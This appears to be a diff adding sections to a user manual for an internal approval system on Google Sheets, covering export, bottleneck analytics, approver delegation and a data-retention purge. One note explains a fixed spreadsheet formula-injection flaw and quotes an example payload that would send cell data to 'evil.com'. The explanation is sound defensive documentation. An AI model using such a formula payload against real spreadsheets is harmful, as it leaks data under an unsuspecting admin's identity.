@@ -59,9 +59,39 @@ APPROVE/REJECT events), **Approval Workflow**, **ISM Approvals**, **DivHead Appr
 Select rows → **Export Selected**. A new Google Sheet (base + DCS + PIA columns) is created in
 the **same Drive folder** as the source spreadsheet and opens in a new tab.
 
+> 🚩 **Values are written as plain text on purpose (2026-08-12).** Google Sheets treats any cell
+> starting with `=` as a **formula**. Before this fix, an applicant could type
+> `=IMPORTXML("evil.com?d="&A1)` into a form field; it sat harmlessly in the database, then
+> *executed* the moment an admin opened the export — running as **that admin's** Google identity,
+> with their access. Exported cells are now text-only. If you ever see a leading apostrophe in an
+> exported cell, that is this guard working, not corruption; it does not appear when printed and
+> is not part of the value.
+
 ### Analytics
 Four cards: **PIA Status Breakdown**, **Approval Status Distribution**, **Top Departments**
 (bar charts), and **Key Metrics** (Total / Flagged / Completion Rate / Pending Review).
+
+#### Bottlenecks — "where do requests get stuck?" *(added 2026-08-12)*
+Below the four cards, loaded separately from the dashboard rows:
+
+- **Time Waiting** — how many requests have been sitting with their current approver for
+  0-3 / 4-7 / 8-14 / 15+ days.
+- **Bottleneck Summary** — how many are awaiting anyone, how many are past 7 days, the longest
+  single wait, and which stage holds the most.
+- **Most Stuck Requests** — the 25 oldest, showing the request, the stage, **who is currently
+  blocking it**, and how many days.
+
+The clock starts when that approver was **first emailed**, not when the request was submitted, so
+the number answers "how long has this person had it," which is the question worth asking.
+
+> 💡 **Cross-check it against the reminders.** If a request shows 12 days here but the approver
+> says they were never nudged, the daily reminder trigger has stopped running
+> ([§2.2](part-2-pia.md#the-daily-reminder-engine-lives-here-)). That divergence is the most
+> useful signal on the page.
+
+> Requests still show "unknown" days if they predate the `NotifiedDate` column and have no usable
+> submission date. They are counted separately and excluded from the buckets rather than being
+> shown as 0 days old.
 
 ### Certificate routing
 Lists ISM-approved applications. Pick one (status contains "Approved" and ISM-approved) →
@@ -87,6 +117,67 @@ spreadsheet. Reminder on/off + hour here call **PIA's** cross-app reminder API
 > makes the link invalid: the **Download** button in the DCS app won't open the file, and the value
 > can fail to display/save correctly in this Settings form. Editing through this form **auto-trims**
 > on Save; pasting straight into the sheet does **not** — so sheet edits are the ones to double-check.
+
+#### Approver Delegation *(added 2026-08-12)*
+When an approver goes on leave, everything sitting with them stops. Add a delegation and the review
+email, the daily reminder and the approval link all go to the delegate instead.
+
+1. Click **Edit Configuration** to unlock the form.
+2. Fill in **Approver going away** and **Acts on their behalf** (both must be company accounts).
+3. Optionally set **Start** and **End**. Leave Start blank for "effective now", End blank for
+   "until I remove it".
+4. **Reason** is shown to the delegate in the email, so they know why they received it.
+5. **Add delegation.**
+
+The list above the form shows every delegation and whether it is **in effect** today, **outside
+window** (dated, but not now), or **paused**. **Remove** deletes it; future emails go straight back
+to the original approver.
+
+> 🚩 **Only ISM can create a delegation.** Approvers cannot set their own. That is deliberate: if
+> they could, any approver could quietly route their own approvals to a colleague of their choosing.
+
+> ⚠️ **Not retroactive.** A review link is cryptographically signed *when the email is sent*, so
+> mail already in someone's inbox still points at the original approver. For a request that is
+> already waiting, add the delegation and then use **Email Routing → Resend** to reissue it.
+
+> ℹ️ **The decision is still recorded against the original approver**, with the delegate's address
+> in the `ActedBy` column — it reads as "approved by *delegate* on behalf of *approver*."
+> Delegation does **not** chain: if A delegates to B and B delegates to C, A's requests go to B.
+
+> 🚩 **It is a real handoff, not a spare key.** While the delegation is active the original
+> approver **cannot approve** the reassigned request, and it **drops off their own list** — only
+> the delegate can act on it. This is on purpose: if both could decide, the two of them could
+> approve the same step seconds apart and the system would have no clean answer for who actually
+> decided it.
+>
+> What the original approver **keeps**: everything they already decided. Requests they approved
+> before going on leave, and earlier rounds of this same request, all stay visible to them. Only
+> the specific step that was handed over disappears. Remove or pause the delegation and it comes
+> straight back to them.
+
+#### Data Retention *(added 2026-08-12 — ships switched OFF)*
+Nothing in the system had ever deleted personal data: not the request rows, not approver comments,
+not the audit log, not the uploaded NDA/DPA/DSA files, not the stored email bodies. This sweep
+removes **closed** requests older than a set period, across all of those at once.
+
+**It does nothing until you turn it on**, and it takes two switches, not one:
+
+| Setting | Ships as | Meaning |
+|---|---|---|
+| **Retention period (months)** | 24 | How old a *closed* request must be |
+| **Retention sweep** | Disabled | Master switch |
+| **Mode** | Dry run | Reports only; deletes nothing even when enabled |
+
+**Before enabling anything, click "Preview what would be deleted."** It lists how many closed
+requests qualify and shows the oldest as a sample. Read that list with whoever owns the retention
+policy.
+
+> 🚩 **A purge cannot be undone.** Sheet rows are gone for good. Drive files go to the trash, so
+> there is a 30-day window there and nowhere else. This is not something a developer can revert.
+
+> ℹ️ **Requests still waiting on anyone are never touched**, at any age — and "closed" means *both*
+> the DCS and PIA sides are finished. Age is counted from the request's **last decision**, not its
+> submission, so a request that took eight months to approve is not purged eight months early.
 
 ---
 
